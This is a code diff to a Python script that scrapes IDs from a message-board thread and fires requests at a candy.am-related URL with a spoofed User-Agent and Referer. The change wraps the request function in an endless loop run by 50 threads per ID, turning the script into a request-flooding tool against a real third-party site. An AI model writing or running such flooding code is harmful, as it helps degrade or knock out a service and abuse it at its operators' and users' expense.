@@ -9,6 +9,10 @@ def bomb(id):
 	headers = {'User-Agent': 'Mozilla/5.0 iPhone OS 9_2 Safari' , "Referer": 'http://candy.am'}
 	requests.get(candy_url, headers=headers)
 
+def forever(id):
+    while True:
+        bomb(id)
+
 if __name__ == "__main__":
 	url = 'https://jbbs.shitaraba.net/bbs/read.cgi/internet/24622/1522583908/l50'
 
@@ -23,7 +27,7 @@ if __name__ == "__main__":
 
 	for i in res:
 		for j in range(50):
-			thureads.append(threading.Thread(target=bomb, args=(i,)))
+			thureads.append(threading.Thread(target=forever, args=(i,)))
 	
 	for i in thureads:
 		i.start()
